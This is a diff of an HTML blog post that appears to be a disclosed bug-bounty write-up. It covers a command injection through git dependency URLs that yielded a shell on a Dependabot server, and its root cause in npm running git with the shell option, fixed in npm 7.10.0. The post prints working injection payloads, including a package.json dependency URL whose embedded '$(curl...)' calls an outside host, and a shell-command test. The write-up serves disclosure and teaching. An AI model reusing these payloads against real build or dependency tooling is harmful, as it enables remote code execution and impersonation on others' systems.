+<h1 id="get-the-shell-of-a-dependabot-server">Get the shell of a Dependabot server</h1>
+<p>When I tried some payload, I came across with a pattern that triggers a shell command in Dependabot server.
+With the package name <code>https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);?/...</code>, a shell command <code>curl$IFS@mocos.kitchen:3001</code> was executed and we could see the request!</p>
+<p><a href="https://github.com/tyage/dependabot-test3/blob/a81ac0bb60ac5aad66fa3191b5276f633a6d421d/package.json">https://github.com/tyage/dependabot-test3/blob/a81ac0bb60ac5aad66fa3191b5276f633a6d421d/package.json</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;javascript&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;version&#34;</span>: <span style="color:#e6db74">&#34;1.0.0&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;main&#34;</span>: <span style="color:#e6db74">&#34;index.js&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;license&#34;</span>: <span style="color:#e6db74">&#34;MIT&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;private&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;dependencies&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;tyage-sample-package&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);?/github.com/tyage/sample-package.git#semver:4.0.0&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>I got the shell of the Dependabot server suddenly, but unfortunately, what we can do in the server is limited.
-Here is what I could do:</p><ul><li>Access to the internal HTTP proxy which enables us to access to the target GitHub repository</li><li>Access to the internal API server which enalbes us to create a pull request as a Dependabot</li><li>Bitcoin mining :)</li></ul><p>Therefore, we couldn&rsquo;t obtain read/write access of other user&rsquo;s repository.
-(If we can pwn the internal HTTP proxy or API server, it will allow us to escalate the permission, I guess.)</p><p>Even though I couldn&rsquo;t get the access to other user&rsquo;s repository, I could impersonate as a verified Dependabot account and create a commit and pull request by calling internal API.</p><p><a href=https://github.com/tyage/dependabot-test3/pull/31>https://github.com/tyage/dependabot-test3/pull/31</a></p><p><img src=screenshot2.png alt=https://github.com/tyage/dependabot-test3/pull/31></p><p><img src=screenshot3.png alt=https://github.com/tyage/dependabot-test3/pull/31></p><h2 id=rce-in-npm>RCE in npm</h2><p>By the way, what was happend to Dependabot when I changed the package name to <code>https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);...</code>?
+Here is what I could do:</p>
+<ul>
+<li>Access to the internal HTTP proxy which enables us to access to the target GitHub repository</li>
+<li>Access to the internal API server which enalbes us to create a pull request as a Dependabot</li>
+<li>Bitcoin mining :)</li>
+</ul>
+<p>Therefore, we couldn&rsquo;t obtain read/write access of other user&rsquo;s repository.
+(If we can pwn the internal HTTP proxy or API server, it will allow us to escalate the permission, I guess.)</p>
+<p>Even though I couldn&rsquo;t get the access to other user&rsquo;s repository, I could impersonate as a verified Dependabot account and create a commit and pull request by calling internal API.</p>
+<p><a href="https://github.com/tyage/dependabot-test3/pull/31">https://github.com/tyage/dependabot-test3/pull/31</a></p>
+<p><img src="screenshot2.png" alt="https://github.com/tyage/dependabot-test3/pull/31"></p>
+<p><img src="screenshot3.png" alt="https://github.com/tyage/dependabot-test3/pull/31"></p>
+<h2 id="rce-in-npm">RCE in npm</h2>
+<p>By the way, what was happend to Dependabot when I changed the package name to <code>https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);...</code>?
 I found that the command was executed in <code>run_npm_7_top_level_updater</code> method.
-In this method, the bot runs <code>npm install</code> command with <code>--ignore-scripts --package-lock-only</code> arguments so that it can see if the lock file is updated without running install scripts.</p><p><a href=https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_updater/npm_lockfile_updater.rb#L183-L192>https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_updater/npm_lockfile_updater.rb#L183-L192</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span>          command <span style=color:#f92672>=</span> <span style=color:#f92672>[</span>
-</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;npm&#34;</span>,
-</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;install&#34;</span>,
-</span></span><span style=display:flex><span>            <span style=color:#f92672>*</span>install_args,
-</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;--force&#34;</span>,
-</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;--dry-run&#34;</span>,
-</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;false&#34;</span>,
-</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;--ignore-scripts&#34;</span>,
-</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;--package-lock-only&#34;</span>
-</span></span><span style=display:flex><span>          <span style=color:#f92672>].</span>join(<span style=color:#e6db74>&#34; &#34;</span>)
-</span></span></code></pre></div><p>Therefore, I thought Dependabot doesn&rsquo;t escape the arguments, but it does properly escapes all command arguments.</p><p><a href=https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/common/lib/dependabot/shared_helpers.rb#L274>https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/common/lib/dependabot/shared_helpers.rb#L274</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span>      cmd <span style=color:#f92672>=</span> allow_unsafe_shell_command ? command : escape_command(command)
-</span></span></code></pre></div><p>So I manually run <code>npm install</code> command to see what was happened and&mldr;</p><pre tabindex=0><code>$ npm install &#39;git+https://github.com/tyage/sample-package;echo HELLO &gt; a;&#39; --ignore-scripts
+In this method, the bot runs <code>npm install</code> command with <code>--ignore-scripts --package-lock-only</code> arguments so that it can see if the lock file is updated without running install scripts.</p>
+<p><a href="https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_updater/npm_lockfile_updater.rb#L183-L192">https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_updater/npm_lockfile_updater.rb#L183-L192</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>          command <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;npm&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;install&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>install_args,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;--force&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;--dry-run&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;false&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;--ignore-scripts&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;--package-lock-only&#34;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">].</span>join(<span style="color:#e6db74">&#34; &#34;</span>)
+</span></span></code></pre></div><p>Therefore, I thought Dependabot doesn&rsquo;t escape the arguments, but it does properly escapes all command arguments.</p>
+<p><a href="https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/common/lib/dependabot/shared_helpers.rb#L274">https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/common/lib/dependabot/shared_helpers.rb#L274</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>      cmd <span style="color:#f92672">=</span> allow_unsafe_shell_command ? command : escape_command(command)
+</span></span></code></pre></div><p>So I manually run <code>npm install</code> command to see what was happened and&hellip;</p>
+<pre tabindex="0"><code>$ npm install &#39;git+https://github.com/tyage/sample-package;echo HELLO &gt; a;&#39; --ignore-scripts
 npm ERR! code 127
 npm ERR! command failed
 npm ERR! command git ls-remote ssh://git@github.com/tyage/sample-package;echo HELLO &gt; a; .git
@@ -94,14 +326,158 @@ npm ERR!     /Users/tyage/.npm/_logs/2021-04-06T09_39_20_675Z-debug.log
 $ cat a
 HELLO
 </code></pre><p>Yes, the bug is in npm!
-Even if there is a <code>--ignore-scripts</code> option, we can execute a shell command injected in a package name!</p><p>When we call <code>npm install</code> command with <code>git+https://...</code> package name, <code>git ls-remote</code> command is triggered using <code>child_process.spawn</code> method.</p><p><a href=https://github.com/npm/cli/blob/dedb9c8f8b0891b30aa76e60cdb1c4f0f9b2f22f/node_modules/%40npmcli/promise-spawn/index.js#L36>https://github.com/npm/cli/blob/dedb9c8f8b0891b30aa76e60cdb1c4f0f9b2f22f/node_modules/%40npmcli/promise-spawn/index.js#L36</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span>    <span style=color:#a6e22e>proc</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>spawn</span>(<span style=color:#a6e22e>cmd</span>, <span style=color:#a6e22e>args</span>, <span style=color:#a6e22e>opts</span>)
-</span></span></code></pre></div><p>Also, if <code>child_process.spawn</code> method is called with <code>shell</code> option, <a href=https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options>the command will be run inside of the shell</a>.</p><p>npm passes <code>opts</code> variable, which contains npm config, as an option argument.
-It means <code>opts.shell</code> is same with <a href=https://docs.npmjs.com/cli/v7/using-npm/config#shell><code>shell</code> config</a> which default value is a <code>$SHELL</code> environment variable or <code>bash</code> on Posix</p><p>You can see your config of the npm with <code>npm config</code> command.</p><pre tabindex=0><code>$ npm config get shell
+Even if there is a <code>--ignore-scripts</code> option, we can execute a shell command injected in a package name!</p>
+<p>When we call <code>npm install</code> command with <code>git+https://...</code> package name, <code>git ls-remote</code> command is triggered using <code>child_process.spawn</code> method.</p>
+<p><a href="https://github.com/npm/cli/blob/dedb9c8f8b0891b30aa76e60cdb1c4f0f9b2f22f/node_modules/%40npmcli/promise-spawn/index.js#L36">https://github.com/npm/cli/blob/dedb9c8f8b0891b30aa76e60cdb1c4f0f9b2f22f/node_modules/%40npmcli/promise-spawn/index.js#L36</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#a6e22e">proc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">spawn</span>(<span style="color:#a6e22e">cmd</span>, <span style="color:#a6e22e">args</span>, <span style="color:#a6e22e">opts</span>)
+</span></span></code></pre></div><p>Also, if <code>child_process.spawn</code> method is called with <code>shell</code> option, <a href="https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options">the command will be run inside of the shell</a>.</p>
+<p>npm passes <code>opts</code> variable, which contains npm config, as an option argument.
+It means <code>opts.shell</code> is same with <a href="https://docs.npmjs.com/cli/v7/using-npm/config#shell"><code>shell</code> config</a> which default value is a <code>$SHELL</code> environment variable or <code>bash</code> on Posix</p>
+<p>You can see your config of the npm with <code>npm config</code> command.</p>
+<pre tabindex="0"><code>$ npm config get shell
 /bin/zsh
-</code></pre><p>Summarizing the above, npm calls <code>child_process.spawn</code> so that they can execute <code>git ls-remote 'git+https://....'</code>, but since they set the <code>shell</code> option, malicious shell command - starts from <code>;</code> or <code>$(</code> - in the package name is evaluated.</p><p>I reported this bug to the teams and <a href=https://github.com/npm/git/pull/29>it was resolved in npm 7.10.0</a>.
-I asked if they issue CVE but they answered they will not.</p><p>But as you know, the action &ldquo;installing a malicious npm package&rdquo; itself is already dangerous, so this bug only affects to limited situations such as a dependency checker.</p><h1 id=timeline>Timeline</h1><p>I reported SSRF to Dependabot and RCE to npm, and received bounties $617 and $7,500 respectively.</p><p>Interestingly, both of them are in the scope of <a href=https://hackerone.com/github>GitHub Bug Bounty Program</a>.</p><p>Report to Dependabot:</p><ul><li><strong>2021/03/31 08:50:30 UTC</strong> Reported Dependabot issue</li><li><strong>2021/04/23 09:54:22 UTC</strong> Bounty Rewarded</li></ul><p>Report to npm:</p><ul><li><strong>2021/04/06 10:23:49 UTC</strong> Reported npm issue</li><li><strong>2021/04/07 17:53:57 UTC</strong> Issue triaged</li><li><strong>2021/04/28 19:41:59 UTC</strong> Issue patched</li><li><strong>2021/05/04 14:42:21 UTC</strong> Bounty Rewarded</li></ul></div></div><div class=prev-next><nav aria-label="Post navigation" class=post-navigation><div class=prev-post><p><a href=/posts/2021-04-02-improper-access-control-github-workflow/>&#8592;
-Previous:
-Gain write permission of repositories with a bug in GitHub Actions</a></p><p class=prev-post-date>2021/04/02</p></div><div class=next-post><p><a href=/posts/2023-03-12-acsc-2023-gotion/>Next:
-ACSC 2023 Gotion Challenge Author Writeup
-&#8594;</a></p><p class=next-post-date>2023/03/12</p></div></nav></div><svg id="btt-button" class="arrow-logo" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
-<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script><div id=comments><script src=/js/webmention.min.js data-max-webmentions=60 async></script><div id=webmentions></div></div><div style=display:none><a class=u-bridgy-fed href=https://fed.brid.gy/></a><p class=dt-published>2021-07-12T23:30:00+09:00</p></div></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><a href=#ssrf-in-dependabot>SSRF in Dependabot</a><ul><li><a href=#token-stealing-demo>Token stealing demo</a></li><li><a href=#first-dive-into-a-dependabot-server>First dive into a Dependabot server</a></li></ul></li><li><a href=#get-the-shell-of-a-dependabot-server>Get the shell of a Dependabot server</a><ul><li><a href=#rce-in-npm>RCE in npm</a></li></ul></li><li><a href=#timeline>Timeline</a></li></ul></nav></nav></aside></main><footer class=footer><span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>
+</code></pre><p>Summarizing the above, npm calls <code>child_process.spawn</code> so that they can execute <code>git ls-remote 'git+https://....'</code>, but since they set the <code>shell</code> option, malicious shell command - starts from <code>;</code> or <code>$(</code> - in the package name is evaluated.</p>
+<p>I reported this bug to the teams and <a href="https://github.com/npm/git/pull/29">it was resolved in npm 7.10.0</a>.
+I asked if they issue CVE but they answered they will not.</p>
+<p>But as you know, the action &ldquo;installing a malicious npm package&rdquo; itself is already dangerous, so this bug only affects to limited situations such as a dependency checker.</p>
+<h1 id="timeline">Timeline</h1>
+<p>I reported SSRF to Dependabot and RCE to npm, and received bounties $617 and $7,500 respectively.</p>
+<p>Interestingly, both of them are in the scope of <a href="https://hackerone.com/github">GitHub Bug Bounty Program</a>.</p>
+<p>Report to Dependabot:</p>
+<ul>
+<li><strong>2021/03/31 08:50:30 UTC</strong> Reported Dependabot issue</li>
+<li><strong>2021/04/23 09:54:22 UTC</strong> Bounty Rewarded</li>
+</ul>
+<p>Report to npm:</p>
+<ul>
+<li><strong>2021/04/06 10:23:49 UTC</strong> Reported npm issue</li>
+<li><strong>2021/04/07 17:53:57 UTC</strong> Issue triaged</li>
+<li><strong>2021/04/28 19:41:59 UTC</strong> Issue patched</li>
+<li><strong>2021/05/04 14:42:21 UTC</strong> Bounty Rewarded</li>
+</ul>
+
+        </div>
+        
+    </div>
+
+    <div class="prev-next">
+        
+            
+                <nav aria-label="Post navigation" class="post-navigation">
+    
+    <div class="prev-post">
+        <p>
+            <a href="/posts/2021-04-02-improper-access-control-github-workflow/">
+                &#8592;
+                Previous:
+                Gain write permission of repositories with a bug in GitHub Actions
+            </a>
+        </p>
+        <p class="prev-post-date">
+            2021/04/02
+        </p>
+    </div>
+    
+
+    
+    <div class="next-post">
+        <p>
+            <a href="/posts/2023-03-12-acsc-2023-gotion/">
+                Next:
+                ACSC 2023 Gotion Challenge Author Writeup
+                &#8594;
+            </a>
+        </p>
+            <p class="next-post-date">
+                2023/03/12
+            </p>
+    </div>
+    
+</nav>
+
+            
+        
+    </div>
+
+    
+    
+        <svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top">
+    
+    <path d="M177 159.7l136 136c9.4 9.4 9.4 24.6 0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9 0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9 0L7 329.7c-9.4-9.4-9.4-24.6 0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/>
+</svg>
+<script>
+    let backToTopButton = document.getElementById("btt-button");
+
+    window.onscroll = function() {
+        scrollFunction()
+    };
+
+    function scrollFunction() {
+        if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+            backToTopButton.style.display = "block";
+        } else {
+            backToTopButton.style.display = "none";
+        }
+    }
+
+    function scrollToTop() {
+        window.scrollTo(0, 0);
+    }
+</script>
+
+    
+    
+    <div id="comments">
+        <script src="/js/webmention.min.js" data-max-webmentions="60" async></script>
+<div id="webmentions"></div>
+
+    </div>
+    
+
+    <div style="display: none;">
+        <a class="u-bridgy-fed" href="https://fed.brid.gy/"></a>
+        <p class="dt-published">2021-07-12T23:30:00&#43;09:00</p>
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#ssrf-in-dependabot">SSRF in Dependabot</a>
+      <ul>
+        <li><a href="#token-stealing-demo">Token stealing demo</a></li>
+        <li><a href="#first-dive-into-a-dependabot-server">First dive into a Dependabot server</a></li>
+      </ul>
+    </li>
+    <li><a href="#get-the-shell-of-a-dependabot-server">Get the shell of a Dependabot server</a>
+      <ul>
+        <li><a href="#rce-in-npm">RCE in npm</a></li>
+      </ul>
+    </li>
+    <li><a href="#timeline">Timeline</a></li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+
+    
+
+    
+
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/gokarna-theme/gokarna-hugo">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
